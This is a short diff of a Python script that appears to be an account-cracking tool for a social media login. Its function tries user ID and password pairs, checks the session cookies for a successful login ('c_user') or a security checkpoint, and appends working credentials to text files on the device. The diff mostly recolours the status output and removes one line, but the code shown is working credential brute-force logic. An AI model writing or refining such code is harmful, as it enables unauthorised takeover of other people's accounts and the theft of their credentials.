@@ -730,8 +730,6 @@ def yxxr(yx):
         yir = ""
     return yir
 
-yxxr = f"{rp}{yxxr}"
-
 # ANIMATION
 gxdsanmtn3 = [
     "[■□□□□□□□□□]",
@@ -1105,17 +1103,17 @@ def gxds_files(uid, pxss):
             ).text
             lxgin = session.cookies.get_dict().keys()
             if "c_user" in lxgin:
-                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - " + yxxr(uid))
+                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - " + yxxr(uid))
+                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
             else:
-                print("\r\r\033[1;31m  [GXDS-X] " + uid + ":" + ps + " - " + yxxr(uid))
+                print("\r\r\033[1;31m  [GXDS-X] " + uid + ":" + ps + "-\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-logs.txt", "a").write(uid + "|" + ps + "\n")
                 continue
         loop += 1
